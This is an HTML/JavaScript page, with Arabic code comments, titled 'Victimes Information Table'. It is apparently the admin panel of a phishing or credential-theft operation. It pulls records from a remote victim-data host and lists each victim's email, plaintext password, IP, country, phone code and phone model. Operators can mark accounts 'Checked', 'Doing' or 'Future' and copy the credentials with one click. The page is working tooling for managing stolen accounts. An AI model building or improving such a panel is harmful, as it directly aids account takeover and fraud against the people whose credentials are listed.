<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Victimes Table</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
  <style>
    .table-wrapper {
      overflow-x: auto;
    }
    .wrap {
      white-space: nowrap;
    }
    .clickable {
      cursor: pointer;
      color: blue;
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <div class="container mt-2 mb-3">
    <h2 class="text-center mb-2">Victimes Information Table v2</h2>
    <div class="d-flex justify-content-between my-3 mx-2">
      <div>
        <button id="prevBtn" class="btn btn-primary d-none">New</button>
      </div>
      <div>
        <button id="nextBtn" class="btn btn-secondary d-none">See more</button>
      </div>
    </div>

    <!-- زر اختيار الفلتر -->
    <div class="dropdown mb-3 d-none">
      <button class="btn btn-primary dropdown-toggle" type="button" id="filterDropdown" data-bs-toggle="dropdown">
        Filter: <span id="selectedFilter">All</span>
      </button>
      <ul class="dropdown-menu">
        <li><a class="dropdown-item filter-option" href="#" data-value="-1">All</a></li>
        <li><a class="dropdown-item filter-option" href="#" data-value="1">Checked</a></li>
        <li><a class="dropdown-item filter-option" href="#" data-value="2">Doing</a></li>
        <li><a class="dropdown-item filter-option" href="#" data-value="3">Nothing</a></li>
        <li><a class="dropdown-item filter-option" href="#" data-value="4">Future</a></li>
        <li><a class="dropdown-item filter-option" href="#" data-value="0">None</a></li>
      </ul>
    </div>

    <div class="table-wrapper">
      <table class="table table-bordered table-striped">
        <thead class="table-dark">
          <tr>
            <th>Status</th>
            <th>ID</th>
            <th>Email</th>
            <th>Password</th>
            <th>IP Address</th>
            <th>Country</th>
            <th>Phone</th>
            <th>Model</th>
            <th>Date</th>
          </tr>
        </thead>
        <tbody id="userTableBody"></tbody>
      </table>
    </div>
  </div>

  <script>
    const currentUrl = new URL(window.location.href);
    let page = parseInt(currentUrl.searchParams.get("p")) || 0;
    let filter = parseInt(currentUrl.searchParams.get("f")) || -1;

    // تحديث الفلتر الظاهر
    document.getElementById('selectedFilter').textContent = getStatusText(filter);

    const prevBtn = document.getElementById('prevBtn');
    const nextBtn = document.getElementById('nextBtn');

    // جلب البيانات مع الفلتر
    async function fetchUserData(start, filter) {
      try {
        const response = await fetch(`https://victim-v6.vercel.app/data/${start}`);
        if (!response.ok) throw new Error('Failed to fetch data');

        let data;
        try {
          data = await response.json();
        } catch (error) {
          console.error("Invalid JSON response:", error);
          return;
        }

        const tableBody = document.getElementById('userTableBody');
        tableBody.innerHTML = '';

        if (data.length === 0 && start > 0) throw new Error("No more records!");

        let rows = '';
        data.slice(0, 10).forEach(user => {
          const statusClass = getStatusClass(user.status);
          const statusText = getStatusText(user.status);

          rows += `
          <tr class="table-${statusClass}" data-id="${sanitize(user.id)}">
          <td>
          <div class="btn-group">
          <button type="button" class="btn btn-${statusClass} dropdown-toggle status-btn" data-bs-toggle="dropdown">
          ${statusText}
          </button>
          <ul class="dropdown-menu">
          <li><a class="dropdown-item" href="#" data-value="1">Checked</a></li>
          <li><a class="dropdown-item" href="#" data-value="2">Doing</a></li>
          <li><a class="dropdown-item" href="#" data-value="3">Nothing</a></li>
          <li><a class="dropdown-item" href="#" data-value="4">Future</a></li>
          <li><hr class="dropdown-divider"></li>
          <li><a class="dropdown-item" href="#" data-value="0">None</a></li>
          </ul>
          </div>
          </td>
          <td>${sanitize(user.id)}</td>
          <td class="clickable">${sanitize(user.email)}</td>
          <td class="clickable">${sanitize(user.password)}</td>
          <td>${sanitize(user.ip)}</td>
          <td>${sanitize(user.country)}</td>
          <td>${sanitize(user.calling_code)}</td>
          <td>${sanitize(user.phone_model)}</td>
          <td class="wrap">${sanitize(formatUnixTimestamp(user.date))}</td>
          </tr>`;
        });
        tableBody.innerHTML = rows;

        page = start;

        const newUrl = new URL(window.location.href);
        newUrl.searchParams.set('p', start);
        window.history.pushState({}, '', newUrl.toString());

        prevBtn.classList.toggle("d-none", start === 0);
        nextBtn.classList.toggle("d-none", data.length < 10);


        addStatusChangeListeners();
        addCopyListeners();

      } catch (error) {
        console.error('Error fetching user data:', error);
      }
    }

    // تحديث الفلتر عند اختيار عنصر جديد
    document.querySelectorAll('.filter-option').forEach(item => {
      item.addEventListener('click', function (event) {
        event.preventDefault();

        filter = parseInt(this.getAttribute('data-value'));
        document.getElementById('selectedFilter').textContent = getStatusText(filter);

        const newUrl = new URL(window.location.href);
        newUrl.searchParams.set('f', filter);
        window.history.pushState({}, '', newUrl.toString());

        fetchUserData(page, filter);
      });
    });

function formatUnixTimestamp(timestamp) {
    const date = new Date(timestamp * 1000); // تحويل الثواني إلى ميللي ثانية

    const year = date.getFullYear();
    const month = String(date.getMonth() + 1).padStart(2, '0'); // إضافة صفر إذا كان الشهر أقل من 10
    const day = String(date.getDate()).padStart(2, '0');

    const hours = String(date.getHours()).padStart(2, '0');
    const minutes = String(date.getMinutes()).padStart(2, '0');
    const seconds = String(date.getSeconds()).padStart(2, '0');

    return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
}

// مثال:
const unixTime = 1743498911;
console.log(formatUnixTimestamp(unixTime));


    function addStatusChangeListeners() {
      document.querySelectorAll('.dropdown-menu .dropdown-item').forEach(item => {
        item.addEventListener('click', function (event) {
          event.preventDefault();

          const newStatus = this.getAttribute('data-value');
          const row = this.closest('tr');
          const id = row.getAttribute('data-id');
          const button = row.querySelector('.status-btn');

          button.textContent = getStatusText(newStatus);
          button.className = `btn btn-${getStatusClass(newStatus)} dropdown-toggle status-btn`;

          row.className = `table-${getStatusClass(newStatus)}`;
          updateStatus(id, newStatus);

          // إغلاق القائمة المنسدلة يدويًا
          let dropdown = bootstrap.Dropdown.getInstance(button);
          if (dropdown) {
            dropdown.hide();
          }
        });
      });
    }

    function updateStatus(id, value) {
      fetch(`https://victim-v6.vercel.app/account/${id}`, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          status: parseInt(value)
        })
      })
      //.then(response => response.json())
      .catch(error => {
        console.error("Fetch error:",
          error);
      });
    }


    function getStatusClass(status) {
      switch (parseInt(status)) {
        case 1: return 'success';
          case 2: return 'warning';
            case 3: return 'danger';
              case 4: return 'primary';
                default: return 'light';
                }
            }

            function getStatusText(status) {
              switch (parseInt(status)) {
                case -1: return 'All';
                  case 1: return 'Checked';
                    case 2: return 'Doing';
                      case 3: return 'Nothing';
                        case 4: return 'Future';
                          default: return 'None';
                          }
                      }

                      function sanitize(input) {
                        const tempDiv = document.createElement('div');
                        tempDiv.textContent = input;
                        return tempDiv.innerText.trim();
                    }

                    function decode(text) {
                      try {
                        return decodeURIComponent(text.replace(/\+/g,
                          ' '));
                    } catch (error) {
                      return text.trim();
                  }
              }

              function unicodeToFlag(unicodeString) {
                return unicodeString.replace(/\\u([0-9A-Fa-f]{4})/g, (_,
                  code) => String.fromCodePoint(parseInt(code, 16)));
              }

              function addCopyListeners() {
                document.querySelectorAll('.clickable').forEach(cell => {
                  cell.addEventListener('click',
                    () => {
                      navigator.clipboard.writeText(cell.textContent);
                  });
              });
        }

        prevBtn.addEventListener('click', () => {
          if (page > 0) fetchUserData(--page, filter);
      });
      nextBtn.addEventListener('click', () => {
        fetchUserData(++page, filter);
    });

    document.addEventListener('DOMContentLoaded', () => {
      fetchUserData(page, filter);
    });
  </script>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>